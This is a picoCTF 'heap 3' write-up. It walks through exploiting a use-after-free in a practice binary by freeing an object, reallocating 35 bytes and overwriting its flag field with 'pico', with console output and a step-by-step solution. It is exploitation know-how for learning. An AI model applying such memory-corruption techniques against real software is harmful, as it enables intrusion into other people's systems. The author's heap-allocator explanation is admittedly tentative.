# heap 3
Challenge Description:
> This program mishandles memory. Can you exploit it to get the flag?

CTF: <b>picoCTF</b> (picoGym)<br>Difficulty: <b>Medium</b>

<b>[Jump to solution](#solution)</b>

## Hints
Here are the hints provided by the challenge author.
<details>
<summary>Hint 1</summary>

> Check out "use after free"
</details>

## Procedure
This challenge involves a common real-world bug in applications developed in memory-unsafe languages. When running the program, there appears to be a variable `x` which has an allocated buffer that contains `bico` at some point.
```
freed but still in use
now memory untracked
do you smell the bug?

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 1
[*]   Address   ->   Value   
+-------------+-----------+
[*]   0x186df6ce  ->   bico
+-------------+-----------+

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 3


x = bico
```

Upon looking at the source code, we can see `x` is an object made of 4 buffers: 3 buffers of size 10, and a `flag` buffer of size 5.
```c
typedef struct {
  char a[10];
  char b[10];
  char c[10];
  char flag[5];
} object;

object *x;
```

We have the options to allocate an object (most likely with `malloc`) as well as one to free `x`.
- Allocating an object lets us decide the size of the object's buffer and then write whatever we want to that buffer. However, it's likely that the allocated memory of this object will be placed at an address higher than that of `x`, meaning we can't overflow into `x` with our new object.

What happens if we free `x` and then attempt to print `x->flag`?
```
Enter your choice: 5

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 3


x = bico
```
Huh... even though `x` was freed, we can still access the buffer contained at `x`. This means we likely have a `use after free` vulnerability on our hands. Is it possible that the call to `malloc()` invoked when we allocate a new object gives us the address `x` previously occupied? It seems likely that if we attempt to `malloc()` an amount of memory similar to the amount previously occupied by `x`, the memory manager may simply hand us the previous address of `x`, allowing us to modify its buffer...

```
Enter your choice: 5

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 2
Size of object allocation: 35
Data for flag: aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllll

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 3


x = hhiiiijjjjkkkkllll3
aabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllll
```

So the memory manager does just give us the address `x` used previously! That means we can overwrite `x->flag` with `pico` as the challenge desires.
```c
void check_win() {
  if(!strcmp(x->flag, "pico")) {
    printf("YOU WIN!!11!!\n");
```

```
Enter your choice: 5

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 2
Size of object allocation: 35
Data for flag: hammyhammyhammyhammyhammyhammypico

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 3


x = pico


1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 4
YOU WIN!!11!!
hammy{u win - hammy}
```

## Solution
1. Free `x`.
2. Allocate a new object of `35` bytes in size. For the data, enter 30 bytes of anything followed by `pico`. Example: `hammyhammyhammyhammyhammyhammypico`
3. Check for win.

## Key Takeaways
I'm not sure if my intuition is entirely correct regarding the memory manager stuff, but when I freed `x` and allocated an amount of memory far from 35 bytes (e.g. `10` or `69`), I was unable to overwrite `x->flag` so I assumed it's because I was allocated a fresh address above `x`. I can only assume it works when allocating 35 bytes because the memory manager would prefer to reuse a previously discarded block of 35 bytes rather than allocate a new fresh block. Additionally, I can faintly recall some stuff about blocks being allocated in sizes that are powers of 2 and some other memory manager shenanigans such as pairing blocks together from my OS courses, so I feel like 35 might not be the only valid input. Perhaps it's time for me to read up on the details of memory management!